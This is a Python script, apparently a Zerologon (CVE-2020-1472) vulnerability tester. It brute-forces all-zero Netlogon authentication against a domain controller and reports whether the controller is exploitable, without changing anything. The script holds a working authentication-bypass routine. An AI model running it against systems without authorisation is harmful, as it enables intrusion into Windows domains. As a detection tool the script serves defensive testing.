from impacket.dcerpc.v5 import nrpc, epm
from impacket.dcerpc.v5.dtypes import NULL
from impacket.dcerpc.v5 import transport
from impacket import crypto
import hmac, hashlib, struct, sys, socket, time
from binascii import hexlify, unhexlify
from subprocess import check_call

def try_zero_authenticate(dc_handle, IPAddress, targetComputer):
  # Connect to the DC's Netlogon service.
  binding = epm.hept_map(IPAddress, nrpc.MSRPC_UUID_NRPC, protocol='ncacn_ip_tcp')
  rpcConnection = transport.DCERPCTransportFactory(binding).get_dce_rpc()
  rpcConnection.connect()
  rpcConnection.bind(nrpc.MSRPC_UUID_NRPC)
  # Use an all-zero challenge and credential.
  plaintext = b'\x00' * 8
  ciphertext = b'\x00' * 8
  # Standard flags observed from a Windows 10 client (including AES), with only the sign/seal flag disabled. 
  flags = 0x212fffff
  # Send challenge and authentication request.
  nrpc.hNetrServerReqChallenge(rpcConnection, dc_handle + '\x00', targetComputer + '\x00', plaintext)
  try:
    serverAuth = nrpc.hNetrServerAuthenticate3(
      rpcConnection, dc_handle + '\x00', targetComputer + '$\x00', nrpc.NETLOGON_SECURE_CHANNEL_TYPE.ServerSecureChannel,
      targetComputer + '\x00', ciphertext, flags
    )
    # It worked!
    assert serverAuth['ErrorCode'] == 0
    return rpcConnection
  except nrpc.DCERPCSessionError as ex:
    # Failure should be due to a STATUS_ACCESS_DENIED error. Otherwise, the attack is probably not working.
    if ex.get_error_code() == 0xc0000022:
      return None
    else:
      print(f'Unexpected error code from DC: {ex.get_error_code()}.', file=sys.stderr)
      print('This might have been caused by invalid arguments or network issues.', file=sys.stderr)
      sys.exit(2)
  except BaseException as ex:
    print(f'Unexpected error: {ex}.', file=sys.stderr)
    print('This might have been caused by invalid arguments or network issues.', file=sys.stderr)
    sys.exit(2)

def perform_attack(dc_handle, IPAddress, targetComputer):
  # Keep authenticating until succesfull. Expected average number of attempts needed: 256.
  print('Performing authentication attempts...')
  rpcConnection = None
  # Give up brute-forcing after 2000 attempts. If vulnerable, 256 attempts are expected to be neccessary on average. False negative chance: 0.04%
  for attempt in range(0, 2000):  
    rpcConnection = try_zero_authenticate(dc_handle, IPAddress, targetComputer)
    if rpcConnection == None:
      print('=', end='', flush=True)
    else:
      break
  if rpcConnection:
    print('\nSuccess! DC can be fully compromised by a Zerologon attack.')
  else:
    print('\nAttack failed. Target is probably patched.')
    sys.exit(1)

if __name__ == '__main__':
  if not (3 <= len(sys.argv) <= 4):
    print('Usage: cve-2020-1472.py <dc-name> <dc-ip>\n')
    print('Tests whether a domain controller is vulnerable to the Zerologon attack. Does not attempt to make any changes.')
    print('Note: dc-name should be the (NetBIOS) computer name of the domain controller.')
    sys.exit(1)
  else:
    [_, DCName, IPAddress] = sys.argv

    DCName = DCName.rstrip('$')
    perform_attack('\\\\' + DCName, IPAddress, DCName)